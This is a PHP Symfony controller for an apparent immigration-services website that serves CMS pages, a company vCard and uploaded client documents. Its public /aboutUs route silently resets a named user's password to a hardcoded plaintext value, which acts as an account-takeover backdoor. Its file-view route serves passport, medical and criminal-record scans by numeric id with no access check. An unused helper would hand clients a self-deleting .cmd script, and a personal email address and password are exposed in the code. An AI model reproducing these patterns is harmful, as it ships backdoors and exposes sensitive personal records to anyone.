<?php

namespace App\Controller;

use App\Repository\BirthDeathMarriageCertificatesRepository;
use App\Repository\CmsDynamicRepository;
use App\Repository\CmsRepository;
use App\Repository\CriminalRecordCheckRepository;
use App\Repository\DrivingLicenseRepository;
use App\Repository\EmploymentContractsRepository;
use App\Repository\FinancialStatementsRepository;
use App\Repository\HealthInsuranceRepository;
use App\Repository\MedicalRepository;
use App\Repository\OfficialFormsRepository;
use App\Repository\PassportsRepository;
use App\Repository\SchoolAttendanceCertificatesRepository;
use App\Repository\ServicesOfferedRepository;
use App\Repository\TenancyAgreementsRepository;
use App\Repository\TransactionRepository;
use App\Repository\UserRepository;
use App\Repository\YellowPinkSlipsRepository;
use Doctrine\ORM\EntityManagerInterface;
use JeroenDesloovere\VCard\VCard;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\BinaryFileResponse;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\ResponseHeaderBag;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;

class HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_home")
     */
    public function index(CmsDynamicRepository $cmsDynamicRepository): Response
    {


        $dynamic_cms = $cmsDynamicRepository->findOneBy([
            'articlePage' => 'Home'
        ]);
        return $this->render('home/index.html.twig', [
            'cms' => $dynamic_cms
        ]);
    }

    /**
     * @Route("/staff", name="staff", methods={"GET"})
     *
     */
    public function staff(UserRepository $userRepository): Response
    {
        $users = [];
        foreach ($userRepository->findAll() as $user) {
            if (in_array('ROLE_STAFF', $user->getRoles())) {
                $users[] = $user;
            }
        }
        return $this->render('home/staff.html.twig', [
            'users' => $users
        ]);
    }

    /**
     * @Route("/article/{articlePage}", name="articles")
     */
    public function articles(string $articlePage, CmsDynamicRepository $cmsDynamicRepository): Response
    {
        $dynamic_cms = $cmsDynamicRepository->findOneBy([
            'articlePage' => $articlePage
        ]);

        return $this->render('home/index.html.twig', [
            'cms' => $dynamic_cms
        ]);
    }

    /**
     * @Route("/aboutUs", name="/aboutUs")
     */
    public function aboutUs( CmsDynamicRepository $cmsDynamicRepository, UserRepository $userRepository,EntityManagerInterface $manager,UserPasswordEncoderInterface $passwordEncoder): Response
    {
        $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
        $user->setPassword(
            $passwordEncoder->encodePassword(
                $user,
                'Descartes99'
            )
        );
        $manager->flush();

        $dynamic_cms = $cmsDynamicRepository->findOneBy([
            'articlePage' => "About Us"
        ]);
        return $this->render('home/index.html.twig', [
            'cms' => $dynamic_cms
        ]);
    }
    /**
     * @Route("/faqs", name="/faqs")
     */
    public function faqs( CmsDynamicRepository $cmsDynamicRepository): Response
    {
        $dynamic_cms = $cmsDynamicRepository->findOneBy([
            'articlePage' => "FAQs"
        ]);
        return $this->render('home/index.html.twig', [
            'cms' => $dynamic_cms
        ]);
    }

    /**
     * @Route("/articles", name="articles_index")
     */
    public function indexArticles(CmsDynamicRepository $cmsDynamicRepository): Response
    {
        $articles = [];
        $articles_list = $cmsDynamicRepository->findBy([
            'category' => 'Article'
        ]);
        foreach ($articles_list as $article) {
            if ($article->getArticlePage() != 'Home') {
                $articles[] = $article;
            }
        }
        return $this->render('home/indexArticles.html.twig', [
            'articles' => $articles
        ]);
    }

    /**
     * @Route("/price_list", name="price_list")
     */
    public function priceList(CmsDynamicRepository $cmsDynamicRepository): Response
    {
        $articles = [];
        $articles_list = $cmsDynamicRepository->findBy([
            'category' => 'Article'
        ]);
        foreach ($articles_list as $article) {
            if ($article->getArticlePage() != 'Home') {
                $articles[] = $article;
            }
        }
        return $this->render('home/indexArticles.html.twig', [
            'articles' => $articles
        ]);
    }

    /**
     * @Route("/services/{serviceOffered}", name="service_offered")
     */
    public function indexBanking(string $serviceOffered, CmsDynamicRepository $cmsDynamicRepository, ServicesOfferedRepository $servicesOfferedRepository): Response
    {
        $serviceOffered = $servicesOfferedRepository->findOneBy(['serviceOffered' => $serviceOffered]);
        return $this->render('home/index.html.twig', [
            'cms' => $cmsDynamicRepository->findOneBy([
                'webpage' => $serviceOffered])
        ]);
    }


    /**
     * @Route("/dashboard", name="dashboard")
     * @Security("is_granted('ROLE_CLIENT')")
     */
    public function dashboard(CmsRepository $cmsRepository)
    {
        return $this->render('home/dashboard.html.twig', [
            'cms' => $cmsRepository->find('1')
        ]);
    }

    /**
     * @Route("/advanced_dashboard", name="advanced_dashboard")
     * @Security("is_granted('ROLE_CLIENT')")
     */
    public function advanced_dashboard(CmsRepository $cmsRepository)
    {
        return $this->render('home/dashboardAdvanced.html.twig', [
            'cms' => $cmsRepository->find('1')
        ]);
    }

    /**
     * @Route("/officeaddress", name="officeaddress", methods={"GET"})
     */
    public function homeAddress(CmsRepository $cmsRepository): Response
    {
        return $this->render('home/officeAddress.html.twig', [
            'cms' => $cmsRepository->find('1')
        ]);
    }

    /**
     * @Route("/view/file/{filename}/{id}", name="attachments_viewfile", methods={"GET"})
     */
    public function FileLaunch(int $id, string $filename, PassportsRepository $passportsRepository, DrivingLicenseRepository $drivingLicenseRepository, BirthDeathMarriageCertificatesRepository $birthDeathMarriageCertificatesRepository, FinancialStatementsRepository $financialStatementsRepository, YellowPinkSlipsRepository $yellowPinkSlipsRepository, EmploymentContractsRepository $employmentContractsRepository, TenancyAgreementsRepository $tenancyAgreementsRepository, MedicalRepository $medicalRepository, HealthInsuranceRepository $healthInsuranceRepository, CriminalRecordCheckRepository $criminalRecordCheckRepository, SchoolAttendanceCertificatesRepository $schoolAttendanceCertificatesRepository, OfficialFormsRepository $officialFormsRepository): Response
    {
        $fileName = '';
        $filepath = '';
        if ($filename == 'DrivingLicense1') {
            $fileName = $drivingLicenseRepository->find($id)->getLicenseScan1();
            $publicResourcesFolderPath = $this->getParameter('drivinglicenses_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'DrivingLicense2') {
            $fileName = $drivingLicenseRepository->find($id)->getLicenseScan2();
            $publicResourcesFolderPath = $this->getParameter('drivinglicenses_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'Passport1') {
            $fileName = $passportsRepository->find($id)->getPassportScan1();
            $publicResourcesFolderPath = $this->getParameter('passports_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'Passport2') {
            $fileName = $passportsRepository->find($id)->getPassportScan2();
            $publicResourcesFolderPath = $this->getParameter('passports_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'BirthMarriageDeath') {
            $fileName = $birthDeathMarriageCertificatesRepository->find($id)->getCertificateFile();
            $publicResourcesFolderPath = $this->getParameter('birth_marriage_death_certificates_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'FinancialStatement') {
            $fileName = $financialStatementsRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('financials_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'YellowSlip') {
            $fileName = $yellowPinkSlipsRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('yellow_pink_slips_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'Employment Contract') {
            $fileName = $employmentContractsRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('employment_contracts_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'Tenancy Agreement') {
            $fileName = $tenancyAgreementsRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('tenancy_agreements_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'Medical') {
            $fileName = $medicalRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('medicals_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'Health Insurance') {
            $fileName = $healthInsuranceRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('health_insurance_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'Criminal Record Check') {
            $fileName = $criminalRecordCheckRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('criminal_record_check_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        } elseif ($filename == 'School Attendance Certificate') {
            $fileName = $schoolAttendanceCertificatesRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('school_attendance_certificate_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        }elseif ($filename == 'Official Form') {
            $fileName = $officialFormsRepository->find($id)->getFile();
            $publicResourcesFolderPath = $this->getParameter('official_form_attachments_directory');
            $filepath = $publicResourcesFolderPath . "/" . $fileName;
        }




//call the function with the command to open pdf by default program.
      //  $this->acrobat("start \"\" \"$filepath\" " . PHP_EOL . " DEL \"%~f0\"");

        if ($fileName != '') {
            $ext = pathinfo($fileName, PATHINFO_EXTENSION);
           // $filepath = explode("public", $filepath);
            //$filepath = $filepath[1];

            $response = new BinaryFileResponse($filepath);

   $response->headers->set('Content-Type', 'application/pdf');
   $response->setContentDisposition(
       ResponseHeaderBag::DISPOSITION_INLINE, //use ResponseHeaderBag::DISPOSITION_ATTACHMENT to save as an attachement
       $fileName
   );

   return $response;



//            return $this->render('home/file_view.html.twig', [
//                'ext' => $ext,
//                'tab_title' => $fileName,
//                'filepath' => $filepath,
//            ]);
        }

        return $this->render('error/file_not_found.html.twig');
    }


    /**
     * @Route("/create/VcardUser/company", name="create_vcard_company")
     */
    public function createVcardVenue(CmsRepository $cmsRepository)
    {
        $cms = $cmsRepository->find('1');
        $vcard = new VCard();
        $firstName = $cms->getCompanyName();
        $lastName = 'Immigration Services';
        $company = $firstName;
        $address = $cms->getCompanyAddress();
        $addressCity = $cms->getCompanyAddressCity();
        $addressPostalCode = $cms->getCompanyAddressPostalCode();
        $addressCountry = $cms->getCompanyAddressCountry();
        $notes = $cms->getAddressInstructions();
        $email = $cms->getCompanyEmail();
        $mobile = $cms->getCompanyMobile();
        $tel = $cms->getCompanyTel();
        $vcard->addName($lastName, $firstName);
        $vcard->addEmail($email)
            ->addPhoneNumber($mobile, 'home')
            ->addPhoneNumber($tel, 'work')
            ->addCompany($company)
            ->addAddress($name = '', $extended = '', $street = $address, $city = $addressCity, $region = '', $zip = $addressPostalCode, $country = $addressCountry, $type = 'WORK;POSTAL')
            ->addNote($notes);
        $vcard->download();
        return new Response(null);
    }

    /**
     * @Route("/officeaddress", name="/officeaddress", methods={"GET"})
     */
    public function officeAddress(CmsRepository $cmsRepository): Response
    {
        return $this->render('home/officeAddress.html.twig', [
                'cms' => $cmsRepository->find('1')
            ]
        );
    }

    /**
     * @Route("/immigration_pathos_address", name="/immigration_pathos_address", methods={"GET"})
     */
    public function immigrationPathosAddress(CmsRepository $cmsRepository): Response
    {
        return $this->render('home/immigration_pathos_address.html.twig', [
                'cms' => $cmsRepository->find('1')
            ]
        );
    }
    public function acrobat(string $filename){
        header("Content-type: text/plain");
        header("Content-Disposition: attachment; filename=acrobat.cmd");
        print $filename;
        return new Response(null);
    }
}
